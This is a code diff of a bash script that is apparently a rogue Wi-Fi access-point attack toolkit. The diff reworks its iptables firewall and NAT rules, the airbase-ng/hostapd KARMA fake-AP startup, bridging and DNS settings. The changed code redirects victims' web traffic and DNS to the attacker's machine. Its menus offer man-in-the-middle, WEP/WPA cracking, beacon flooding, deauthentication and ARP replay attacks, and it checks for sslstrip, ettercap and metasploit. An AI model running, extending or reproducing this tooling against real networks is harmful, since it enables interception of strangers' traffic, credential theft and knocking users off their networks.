+iptables --table filter --append INPUT -j input_rule
+iptables --table filter --append INPUT -j input
+iptables --table filter -P INPUT ACCEPT
+echo "  Loading Output..."
+iptables --table filter --append OUTPUT -j ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
+iptables --table filter --append OUTPUT -j DROP -m conntrack --ctstate INVALID
+iptables --table filter --append OUTPUT -j ACCEPT -o lo
+iptables --table filter --append OUTPUT -j output_rule
+iptables --table filter --append OUTPUT -j output
+iptables --table filter -P OUTPUT ACCEPT
+echo "  Loading Forward..."
+iptables --table filter --append FORWARD -j ACCEPT -m conntrack --ctstate RELATED,ESTABLISHED
+iptables --table filter --append FORWARD -j DROP -m conntrack --ctstate INVALID
+iptables --table filter --append FORWARD -j forwarding_rule
+iptables --table filter --append FORWARD -j forward
+iptables --table filter -P FORWARD ACCEPT
+}
+function fw_rules(){
+iptables --table filter --append reject -j REJECT --reject-with tcp-reset -p tcp
+iptables --table filter --append reject -j REJECT --reject-with port-unreach
+iptables --table filter --append zone_lan -j zone_lan_ACCEPT
+iptables --table filter --insert zone_lan 1 -j input_lan
+iptables --table filter --append zone_lan_forward -j zone_lan_ACCEPT
+iptables --table filter --insert zone_lan_forward 1 -j forwarding_lan
+iptables --table filter --append output -j zone_lan_ACCEPT
+iptables --table nat --append PREROUTING -j prerouting_rule
+iptables --table nat --append POSTROUTING -j postrouting_rule
+iptables --table nat --insert zone_lan_prerouting 1 -j prerouting_lan
 }
 ###############################
 # NETWORK ADDRESS TRANSLATION #
 ###############################
-function firewallbrlan(){
-iptables -A forward -i br-lan -j zone_lan_forward
-iptables -A forward -i $WANIFACE -j zone_wan_forward
-iptables -A forwarding_rule -j nat_reflection_fwd
-iptables -A input -i br-lan -j zone_lan
-iptables -A input -i $WANIFACE -j zone_wan
-iptables -A zone_lan_ACCEPT -o br-lan -j ACCEPT
-iptables -A zone_lan_ACCEPT -i br-lan -j ACCEPT
-iptables -A zone_lan_DROP -o br-lan -j DROP
-iptables -A zone_lan_DROP -i br-lan -j DROP
-iptables -A zone_lan_REJECT -o br-lan -j reject
-iptables -A zone_lan_REJECT -i br-lan -j reject
-iptables -t nat -A PREROUTING -i br-lan -j zone_lan_prerouting
-iptables -t nat -A PREROUTING -i $WANIFACE -j zone_wan_prerouting
-iptables -t nat -A POSTROUTING -o br-lan -j zone_lan_nat
-iptables -t nat -A POSTROUTING -o $WANIFACE -j zone_wan_nat
-iptables -A zone_wan -p udp -m udp --dport 68 -j ACCEPT
-iptables -A zone_wan -p icmp -j ACCEPT
-iptables -A zone_wan -j input_wan
-iptables -A zone_wan -j zone_wan_ACCEPT
-iptables -A zone_wan_ACCEPT -o $WANIFACE -j ACCEPT
-iptables -A zone_wan_ACCEPT -i $WANIFACE -j ACCEPT
-iptables -A zone_wan_DROP -o $WANIFACE -j DROP
-iptables -A zone_wan_DROP -i $WANIFACE -j DROP
-iptables -A zone_wan_REJECT -o $WANIFACE -j reject
-iptables -A zone_wan_REJECT -i $WANIFACE -j reject
-iptables -A zone_wan_forward -j zone_lan_ACCEPT
-iptables -A zone_wan_forward -j forwarding_wan
-iptables -A zone_wan_forward -j zone_wan_ACCEPT
+function fw_interfaces(){
+iptables --table filter --append FORWARD -j ACCEPT -i $BRLANIFACE
+iptables --table filter --append zone_lan_ACCEPT -j ACCEPT -o $BRLANIFACE
+iptables --table filter --append zone_lan_ACCEPT -j ACCEPT -i $BRLANIFACE
+iptables --table filter --append zone_lan_DROP -j DROP -o $BRLANIFACE
+iptables --table filter --append zone_lan_DROP -j DROP -i $BRLANIFACE
+iptables --table filter --append zone_lan_REJECT -j reject -o $BRLANIFACE
+iptables --table filter --append zone_lan_REJECT -j reject -i $BRLANIFACE
+iptables --table filter --append input -j zone_lan -i $BRLANIFACE
+iptables --table filter --append forward -j zone_lan_forward -i $BRLANIFACE
+iptables --table nat --append PREROUTING -j zone_lan_prerouting -i $BRLANIFACE
+iptables --table raw --append PREROUTING -j zone_lan_notrack -i $BRLANIFACE
+iptables --table nat --append POSTROUTING -j zone_lan_nat -o $BRLANIFACE
 }
-function firewallnat(){
-echo "######################"
-echo "# NAT TABLES INSTALL #"
-echo "######################"
-iptables -t nat -N nat_reflection_in
-iptables -t nat -N nat_reflection_out
-iptables -t nat -N postrouting_rule
-iptables -t nat -N prerouting_lan
-iptables -t nat -N prerouting_rule
-iptables -t nat -N prerouting_wan
-iptables -t nat -N zone_lan_nat
-iptables -t nat -N zone_lan_prerouting
-iptables -t nat -N zone_wan_nat
-iptables -t nat -N zone_wan_prerouting
-iptables -t nat -A PREROUTING -j prerouting_rule
-iptables -t nat -A POSTROUTING -j postrouting_rule
-iptables -t mangle -N internet
-iptables -t mangle -A PREROUTING -i $TAPIFACE -p tcp -m tcp --dport 80 -j internet
-iptables -t mangle -A internet -j MARK --set-mark 99
-iptables -t mangle -A FORWARD -j zone_wan_MSSFIX
-iptables -t mangle -A zone_wan_MSSFIX -o $WANIFACE -p tcp -m tcp --tcp-flags SYN,RST SYN -j TCPMSS --clamp-mss-to-pmtu
-iptables -t nat -A PREROUTING -i $TAPIFACE -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to $TAPIP
-listeningports
-for TCPPORT in `grep -v N $sessionfolder/logs/listentcp.txt`; do 
-#iptables -t nat -A nat_reflection_in -s $NETWORK -d $WANIP/32 -p tcp -m tcp --dport $TCPPORT -j DNAT --to-destination $TAPIP:$TCPPORT;
-iptables -t nat -A nat_reflection_out -s $NETWORK -d $TAPIP/32 -p tcp -m tcp --dport $TCPPORT -j SNAT --to $TAPIP;
-#iptables -t nat -A zone_wan_prerouting -d $WANIP/32 -p tcp -m tcp --dport $TCPPORT -j DNAT --to-destination $TAPIP:$TCPPORT;
-iptables -A nat_reflection_fwd -s $NETWORK -d $TAPIP/32 -p tcp -m tcp --dport $TCPPORT -j ACCEPT; done
+function fw_wan(){
+iptables --table filter --append zone_wan -j zone_wan_ACCEPT
+iptables --table filter --insert zone_wan 1 -j input_wan
+iptables --table filter --insert zone_wan 1 -j ACCEPT -p udp --dport 68
+iptables --table filter --insert zone_wan 2 -j ACCEPT -p icmp
+iptables --table filter --append zone_wan_forward -j zone_wan_ACCEPT
+iptables --table filter --insert zone_wan_forward 1 -j forwarding_wan
+iptables --table filter --insert zone_wan_forward 1 -j zone_lan_ACCEPT
+iptables --table filter --insert zone_wan_forward 1 -j DROP -p tcp
+iptables --table nat --append zone_wan_nat -j MASQUERADE -s 0.0.0.0/0 -d 0.0.0.0/0
+iptables --table nat --insert zone_wan_prerouting 1 -j prerouting_wan
+iptables --table filter --append output -j zone_wan_ACCEPT
+iptables --table mangle --append FORWARD -j zone_wan_MSSFIX
+iptables --table mangle --append zone_wan_MSSFIX -j TCPMSS -o $WANIFACE -p tcp --tcp-flags SYN,RST SYN --clamp-mss-to-pmtu
+iptables --table mangle --append PREROUTING -i $BRLANIFACE -p tcp --dport 80 -j internet
+iptables --table mangle --append internet -j MARK --set-mark 99
+iptables --table filter --append zone_wan_ACCEPT -j ACCEPT -o $WANIFACE
+iptables --table filter --append zone_wan_ACCEPT -j ACCEPT -i $WANIFACE
+iptables --table filter --append zone_wan_DROP -j DROP -o $WANIFACE
+iptables --table filter --append zone_wan_DROP -j DROP -i $WANIFACE
+iptables --table filter --append zone_wan_REJECT -j reject -o $WANIFACE
+iptables --table filter --append zone_wan_REJECT -j reject -i $WANIFACE
+iptables --table filter --append input -j zone_wan -i $WANIFACE
+iptables --table filter --append forward -j zone_wan_forward -i $WANIFACE
+iptables --table filter -t nat --append PREROUTING -j zone_wan_prerouting -i $WANIFACE
+iptables --table filter -t raw --append PREROUTING -j zone_wan_notrack -i $WANIFACE
+iptables --table filter -t nat --append POSTROUTING -j zone_wan_nat -o $WANIFACE
+}
+function fw_listeningports(){
+netstat -npltw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listentcp.txt
+netstat -npluw | awk '/0.0.0.0/ {print $4}' | cut -f2 -d ':' > $sessionfolder/logs/listenudp.txt
+}
+function fw_natreflection(){
+fw_listeningports
+iptables --table nat --append prerouting_rule -j nat_reflection_in
+iptables --table nat --append postrouting_rule -j nat_reflection_out
+iptables --table filter --append forwarding_rule -j nat_reflection_fwd
+for TCPPORT in `grep -v N $sessionfolder/logs/listentcp.txt`; do
+iptables --table nat --append nat_reflection_in -s $TAPIP/16 -d $WANIP -p tcp --dport $TCPPORT -j DNAT --to $TAPIP:$TCPPORT;
+iptables --table nat --append nat_reflection_out -s $TAPIP/16 -d $TAPIP -p tcp --dport $TCPPORT -j SNAT --to-source $TAPIP;
+iptables --table filter --append nat_reflection_fwd -s $TAPIP/16 -d $TAPIP -p tcp --dport $TCPPORT -j ACCEPT;
+done
 for UDPPORT in `grep -v N $sessionfolder/logs/listenudp.txt`; do
-#iptables -t nat -A nat_reflection_in -s $NETWORK -d $WANIP/32 -p udp -m udp --dport $UDPPORT -j DNAT --to-destination $TAPIP:$UDPPORT;
-iptables -t nat -A nat_reflection_out -s $NETWORK -d $TAPIP/32 -p udp -m udp --dport $UDPPORT -j SNAT --to $TAPIP;
-#iptables -t nat -A zone_wan_prerouting -d $WANIP/32 -p udp -m udp --dport $UDPPORT -j DNAT --to-destination $TAPIP:$UDPPORT;
-iptables -A nat_reflection_fwd -s $NETWORK -d $TAPIP/32 -p udp -m udp --dport $UDPPORT -j ACCEPT; done
-iptables -t nat -A postrouting_rule -j nat_reflection_out
-iptables -t nat -A prerouting_rule -j nat_reflection_in
-iptables -t nat -A zone_lan_prerouting -j prerouting_lan
-iptables -t nat -A zone_wan_nat -j MASQUERADE
-iptables -t nat -A POSTROUTING -o $TAPIFACE -s $NETOWRK -d $NETWORK -j MASQUERADE
-echo "####################"
-echo "# DONE WITH NAT FW #"
-echo "####################"
-customfirewall
+iptables --table nat --append nat_reflection_in -s $TAPIP/16 -d $WANIP -p udp --dport $UDPPORT -j DNAT --to $TAPIP:$UDPPORT;
+iptables --table nat --append nat_reflection_out -s $TAPIP/16 -d $TAPIP -p udp --dport $UDPPORT -j SNAT --to-source $TAPIP;
+iptables --table filter --append nat_reflection_fwd -s $TAPIP/16 -d $TAPIP -p udp --dport $UDPPORT -j ACCEPT;
+done
+}
+function fw_rules(){
+fw_listeningports
+for TCPPORT in `grep -v N $sessionfolder/logs/listentcp.txt`; do
+iptables --table nat --append zone_wan_prerouting -j DNAT -d $WANIP/32 -p tcp --dport $TCPPORT --to-destination $TAPIP:$TCPPORT;
+iptables --table filter --append zone_wan_forward -j ACCEPT -d $TAPIP/32 -p tcp --dport $TCPPORT;
+done
+for UDPPORT in `grep -v N $sessionfolder/logs/listenudp.txt`; do
+iptables --table nat --append zone_wan_prerouting -j DNAT -d $WANIP/32 -p tcp --dport $UDPPORT --to-destination $TAPIP:$UDPPORT;
+iptables --table filter --append zone_wan_forward -j ACCEPT -d $TAPIP/32 -p tcp --dport $UDPPORT;
+done
+}
+function fw_logs(){
+iptables --table filter --append logaccept -m limit --limit 2/m -j LOG --log-prefix "LOGACCEPT: "
+iptables --table filter --append logaccept -j ACCEPT
+iptables --table filter --append logbrute -m limit --limit 5/m -j LOG --log-prefix "LOGBRUTE: "
+iptables --table filter --append logbrute -j DROP
+iptables --table filter --append logdrop -m limit --limit 5/m -j LOG --log-prefix "LOGDROP: "
+iptables --table filter --append logdrop -j DROP
+iptables --table filter --append logreject -m limit --limit 5/m -j LOG --log-prefix "LOGREJECT: "
+iptables --table filter --append logreject -j REJECT -p tcp --reject-with tcp-reset
+iptables --table filter --append logreject -j DROP
+}
+function fw_custom(){
+# iptables --table filter --append INPUT -i $WANIFACE -p tcp --dport 22 -j logbrute
+iptables --table filter --append INPUT -p tcp -d $TAPIP --dport 22 -j logaccept
+# iptables --table filter --append INPUT -i $WANIFACE -p icmp -j ACCEPT
+# iptables --table filter --append INPUT -i lo -m state --state NEW -j ACCEPT
+iptables --table filter --append INPUT -i $TAPIFACE -m state --state NEW -j logaccept
+iptables --table filter --append INPUT -i eth0 -m state --state NEW -j logaccept
+iptables --table filter --append INPUT -j logdrop
+iptables --table filter --append OUTPUT -o $TAPIFACE -j logaccept
+# iptables --table filter --append FORWARD -o $WANIFACE -s $NETWORK -j logaccept
+iptables --table filter --append FORWARD -i $TAPIFACE -j logaccept
+iptables --table filter --append FORWARD -i $TAPIFACE -o $TAPIFACE -j logaccept
+# iptables --table filter --append FORWARD -j victim2wan
+iptables --table filter --append FORWARD -m state --state RELATED,ESTABLISHED -j logaccept
+# iptables --table filter --append FORWARD -i $TAPIFACE -o $WANIFACE -j logaccept
+iptables --table filter --append FORWARD -o $TAPIFACE -d $TAPIP -j logaccept
+iptables --table filter --append FORWARD -i $TAPIFACE -m state --state NEW -j logaccept
+iptables --table filter --append FORWARD -j logdrop
+iptables --table nat --append PREROUTING -i $TAPIFACE -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to $TAPIP
+iptables --table nat --append POSTROUTING -o $TAPIFACE -s $NETOWRK -d $NETWORK -j MASQUERADE
 }
 #####################
 # STARTING SERVICES #
@@ -611,9 +829,10 @@ hostapd -dd -f $sessionfolder/logs/hostapd.log -P $sessionfolder/pids/hostapd.pi
 sleep 7
 }
 function startairbase(){
-if [ "karma_enabled" != "1" ]; then KARMA=`-e \"$ESSID\"`;
-echo "* STARTING SERVICE: AIRBASE-NG (WITH KARMA) *"; else echo "* STARTING SERVICE: AIRBASE-NG *"; fi
-airbase-ng -a $MAC -c $CHAN -x $PPS -I $BEAINT $KARMA $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
+modprobe tun
+sleep 2
+echo "* STARTING SERVICE: AIRBASE-NG *";
+airbase-ng -a $ATHIFACEMAC -c $CHAN -x $PPS -I $BEAINT $ESSID $MONIFACE -P -C 15 -v > $sessionfolder/logs/airbaseng.log &
 }
 function startdnsmasq(){
 echo "no-poll" >> $dnsmasqconf
@@ -623,14 +842,10 @@ gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
 "dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
 }
 function startdnsmasqresolv(){
-echo "dhcp-option=wirelesslan,6,$TAPIP,8.8.8.8" >> $dnsmasqconf
+echo "dhcp-option=wirelesslan,6,8.8.8.8,$TAPIP" >> $dnsmasqconf
 echo "* DNSMASQ With Internet *"
 gnome-terminal --geometry="$termwidth"x35 --hide-menubar --title=DNSERVER -e \
 "dnsmasq --no-daemon --except-interface=lo -C $dnsmasqconf"
-}
-function udhcpdserver(){
-gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
-"udhcpd"
 }
 function dhcpdserver(){
 gnome-terminal --geometry="$termwidth"x15 --hide-menubar --title=DHCP-"$ESSID" -e \
@@ -720,31 +935,27 @@ gnome-terminal --geometry="$termwidth"x17 --hide-menubar --title=PROBE -e "/bin/
 # INTERFACE PREP SECTION #
 ##########################
 function brlan(){
-brctl addbr br-lan
-brctl addif br-lan $TAPIFACE
-brctl addif br-lan $LANIFACE
 ifconfig $TAPIFACE 0.0.0.0 up
-ifconfig $LANIFACE 0.0.0.0 up
-ifconfig br-lan up
-iptables -A FORWARD -i br-lan -j ACCEPT
-echo ""
-echo "* ATTEMPTING TO BRIDGE ON $LANIFACE (br-lan) *"
-dhclient3 br-lan &>$sessionfolder/logs/bridge.log
+brctl addbr $BRLANIFACE
+echo "* ATTEMPTING TO BRIDGE ON $TAPIFACE (br-lan) *"
+brctl addif $BRLANIFACE $TAPIFACE
+ifconfig $BRLANIFACE $TAPIP netmask $NETMASK up;
+route add -net $TAPIPBLOCK netmask $NETMASK gw $TAPIP;
+}
+function brlan_addwan(){
+dhclient -4 -d $WANIFACE &>$sessionfolder/logs/bridge.log
 BRLANDHCP=$(awk '/DHCPOFFERS/ { print $1 }' < <(cat $sessionfolder/logs/bridge.log))
 while [ "$BRLANDHCP" = "No" ]; do
 echo ""
-echo "* [$FAIL] No DHCP Server Found On $LANIFACE (br-lan) *"
+echo "* [$FAIL] No DHCP Server Found On $WANIFACE *"
 rm $sessionfolder/logs/bridge.log
-brlandown
-sleep 2
-brlan
 done
-echo ""
 pinggateway
 }
 function brlandown(){
-ifconfig br-lan down
-brctl delbr br-lan
+ifconfig $BRLANIFACE down
+brctl delif $BRLANIFACE $TAPIFACE
+brctl delbr $BRLANIFACE
 }
 function monitormodestop(){
 echo "* ATTEMPTING TO STOP MONITOR-MODE *"
@@ -804,7 +1015,7 @@ echo "+===================================+"
 echo "| Choose You're Poison?             |"
 echo "+===================================+"
 echo "| 1) Attack Mode | *DEFAULT*         "
-echo "| 2) Bridge Mode | Man In The Middle "
+echo "| 2) Internet Mode | Man In Middle   "
 echo "| 3) WEP/WPA Hack | AutoPwn          "
 echo "| 4) Beacon Flood | Fake AP Flood    "
 echo "| 5) Deauth Mode | Boot People Off   "
@@ -820,8 +1031,8 @@ function softapmenu(){
 echo "+===================================+"
 echo "| Which AP Software?                |"
 echo "+===================================+"
-echo "| 0) Airbase-NG All Probes           "
-echo "| 1) HOSTAPD w KARMA                 "
+echo "| 1) Airbase-NG All Probes           "
+echo "| 2) HOSTAPD w KARMA                 "
 echo "+===================================+"
 echo ""
 read -e -p "Option: " softap
@@ -871,9 +1082,9 @@ echo "+===================================+"
 echo "| SCANNING NEARBY WIFIS             |"
 echo "+===================================+"
 #iwlist $ATHIFACE scan | awk '/Address/ {print $5}' > $sessionfolder/logs/scannedwifimaclist.txt
-echo "a/$MAC|any" > $sessionfolder/logs/droprules.txt
+echo "a/$ATHIFACEMAC|any" > $sessionfolder/logs/droprules.txt
 echo "d/any|any" >> $sessionfolder/logs/droprules.txt
-echo "$MAC" > $sessionfolder/logs/whitelist.txt
+echo "$ATHIFACEMAC" > $sessionfolder/logs/whitelist.txt
 #isempty=$(ls -l $sessionfolder/logs | awk '/scannedwifimaclist.txt/ {print $5}')
 echo ""
 echo "+===================================+"
@@ -1130,7 +1341,7 @@ echo "******************************************************************";
 echo "**************Please select the type of attack below**************";
 echo "THIS WILL DELETE ANY PREVIOUS h4x0r.cap* FILE RENAME IT TO KEEP IT";
 echo "******************************************************************";
-showMenu () {
+showMenu (){
  echo
  echo "1) ARP request replay attack (clientless)"
  echo "2) NOT TESTED Fragmentation (clientless)"
@@ -1203,54 +1414,14 @@ done
 # --------------------------- #
 # SCRIPT ACTUALLY STARTS HERE #
 # --------------------------- #
-
-mydistro="`awk '{print $1}' /etc/issue`"
-myversion="`awk '{print $2}' /etc/issue`"
-myrelease="`awk '{print $3}' /etc/issue`"
-# Dep Check
 banner
+setupenv
 sleep 5
+# debugenv
 pinginternet
-echo "+===================================+"
-echo "| Dependency Check                  |"
-echo "+===================================+"
-# Are we root?
-if [ $UID -eq 0 ]; then echo "We are root: `date`" >> $LOG
-else
-echo "[$FAIL] Please Run This Script As Root or With Sudo!";
-echo "";
-exit 0; fi
-if [ -f $settings ]; then echo "| [$OK] Config File Found!"; fi
-if [ "$mydistro" = "BackTrack" ]; then echo "| [$OK] $mydistro Version $myversion Release $myrelease"; fi
-if [ "$mydistro" = "Ubuntu" ]; then echo "| [$OK] $mydistro Version $myversion"; fi
-echo "| [$OK] SCRIPT REVISION: $REVISION"
-if [ "$INTERNET" = "FALSE" ]; then echo "| [$FAIL] No Internet Connection : - ("; fi
-if [ "$INTERNET" = "TRUE" ]; then echo "| [$OK] We Have Internet :-)"; dnscheck; fi
-if [ "$ICMPBLOCK" = "TRUE" ]; then echo "| [!] Outbound ICMP Ping Is Blocked WAN SIDE ($WANIP)"; fi
-if [ "$DNS" = "FALSE" ]; then echo "| [$FAIL] DNS Error Cant Update Check"; fi
-type -P aircrack-ng &>/dev/null || { echo "| [FATAL] aircrack-ng"; echo "aircrack-ng" >> $sessionfolder/logs/missing.log;}
-type -P dnsmasq &>/dev/null || { echo "| [$FAIL] dnsmasq"; echo "dnsmasq" >> $sessionfolder/logs/missing.log;}
-if [ "$mydistro" = "BackTrack" ]; then
-type -P dhcpd3 &>/dev/null || { echo "| [$FAIL] dhcpd3"; echo "dhcpd3" >> $sessionfolder/logs/missing.log;}
-fi
-if [ "$mydistro" != "BackTrack" ]; then
-type -P dhcpd &>/dev/null || { echo "| [$FAIL] dhcpd"; echo "dhcpd" >> $sessionfolder/logs/missing.log;}
-fi
-type -P airdrop-ng &>/dev/null || { echo "| [$FAIL] airdrop-ng"; echo "airdrop-ng" >> $sessionfolder/logs/missing.log;}
-type -P xterm &>/dev/null || { echo "| [$FAIL] xterm"; echo "xterm" >> $sessionfolder/logs/missing.log;}
-type -P iptables &>/dev/null || { echo "| [$FAIL] iptables"; echo "iptables" >> $sessionfolder/logs/missing.log;}
-type -P ettercap &>/dev/null || { echo "| [$FAIL] ettercap"; echo "ettercap" >> $sessionfolder/logs/missing.log;}
-type -P arpspoof &>/dev/null || { echo "| [$FAIL] arpspoof"; echo "arpspoof" >> $sessionfolder/logs/missing.log;}
-type -P sslstrip &>/dev/null || { echo "| [$FAIL] sslstrip"; echo "sslstrip" >> $sessionfolder/logs/missing.log;}
-type -P driftnet &>/dev/null || { echo "| [$FAIL] driftnet"; echo "driftnet" >> $sessionfolder/logs/missing.log;}
-type -P urlsnarf &>/dev/null || { echo "| [$FAIL] urlsnarf"; echo "urlsnarf" >> $sessionfolder/logs/missing.log;}
-type -P dsniff &>/dev/null || { echo "| [$FAIL] dsniff"; echo "dsniff" >> $sessionfolder/logs/missing.log;}
-type -P python &>/dev/null || { echo "| [$FAIL] python"; echo "python" >> $sessionfolder/logs/missing.log;}
-type -P macchanger &>/dev/null || { echo "| [$FAIL] macchanger"; echo "macchanger" >> $sessionfolder/logs/missing.log;}
-type -P msfconsole &>/dev/null || { echo "| [$FAIL] metasploit"; echo "metasploit" >> $sessionfolder/logs/missing.log;}
-# apt-get install python-dev
-echo "+===================================+"
-echo ""
+depends
+# apachesetup
+# apachecheck
 if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then checkupdate; fi
 if [ "$INTERNET" = "TRUE" ] && [ "$DNS" = "TRUE" ]; then internetmenu; fi
 if [ "$internetmenu" = "1" ]; then installdeps; fi
@@ -1258,54 +1429,38 @@ if [ "$internetmenu" = "2" ]; then installdeps; fi
 if [ "$internetmenu" = "3" ]; then forceupdate; fi
 if [ "$internetmenu" = "4" ]; then runscript; fi
 stopshit
-modprobe tun
 echo ""
 poisonmenu
-softapmenu
-if [ -f != $settings ]; then settings; fi
-if [ "$softap" = "0" ]; then TAPIFACE=at0; fi
-if [ "$softap" = "1" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
+if [ -f != $settings ]; then softapmenu; fi
 if [ "$mode" != "2" ]; then dhcpmenu; fi
+if [ -f != $settings ]; then settings; fi
+# debugsettings
+if [ "$softap" = "1" ]; then TAPIFACE=at0; fi
+if [ "$softap" = "2" ] && [ "$ATHIFACE" != "" ]; then TAPIFACE=$ATHIFACE; fi
 monitormodestop
 if [ "$mode" = "4" ]; then wepattackmenu; fi
-echo "* STARTING ACCESS POINT: $ESSID *"
-echo "* WIRELESS IFACE: $TAPIFACE *"
-echo "* IP: $TAPIP *"
-echo "* BSSID: $MAC *"
-echo "* CHANNEL: $CHAN *"
-echo "* PACKETS PER SECOND: $PPS *"
-echo "* BEACON INTERVAL: $BEAINT *"
-if [ "$softap" = "0" ]; then monitormodestart; startairbase; fi
-if [ "$softap" = "1" ]; then hostapdconfig; starthostapd; fi
+# debugsettings
+if [ "$softap" = "1" ]; then monitormodestart; startairbase; fi
+if [ "$softap" = "2" ]; then hostapdconfig; starthostapd; fi
 sleep 2
-if [ "$mode" != "2" ]; then
-ifconfig $TAPIFACE up
-ifconfig $TAPIFACE $TAPIP netmask $NETMASK;
-if [ "$softap" = "0" ]; then ifconfig $TAPIFACE mtu $MTU; fi
-route add -net $TAPIPBLOCK netmask $NETMASK gw $TAPIP; fi
-wireshark -i $TAPIFACE -k &
-if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
+brlan
+# if [ "$mode" != "2" ]; then wireshark -i $TAPIFACE -k &; fi
 if [ "$DHCPSERVER" = "1" ]; then dnsmasqconfig; fi
 if [ "$DHCPSERVER" = "2" ]; then dhcpd3config; fi
 if [ "$DHCPSERVER" = "3" ]; then udhcpdconfig; fi
 if [ "$DHCPSERVER" = "4" ]; then nodhcpserver; fi
-firewall
-firewallprenat
+if [ "$mode" = "2" ]; then DHCPSERVER=4; fi
 if [ "$mode" = "1" ]; then
-apachesetup
-apachecheck
-#echo "# Generated by accesspoint.sh" > /etc/resolv.conf
-#echo "nameserver 127.0.0.1" >> /etc/resolv.conf
+echo "# Generated by accesspoint.sh" > /etc/resolv.conf
+echo "nameserver 127.0.0.1" >> /etc/resolv.conf
 fi
 if [ "$mode" = "2" ]; then
-brlan
-firewallbrlan
 echo "# Generated by accesspoint.sh" > /etc/resolv.conf
 echo "nameserver 8.8.8.8" >> /etc/resolv.conf
 fi
-firewallnat
-if [ "$softap" = "0" ]; then taillogsairbase; fi
-if [ "$softap" = "1" ]; then taillogshostapd; fi
+if [ "$softap" = "1" ]; then taillogsairbase; fi
+if [ "$softap" = "2" ]; then taillogshostapd; fi
+fw_start
 attackmenu
 if [ "$attack" = "1" ]; then deauth; fi
 if [ "$attack" = "2" ]; then wireshark -i $TAPIFACE -p -k -w $folder/$TAPIFACE.pcap; fi
@@ -1319,7 +1474,7 @@ if [ "$attack" = "9" ]; then
 echo ""
 echo "ATEMPTING TO END ATTACK..."
 stopshit
+brlandown
 monitormodestop
 cleanup
 fi
-
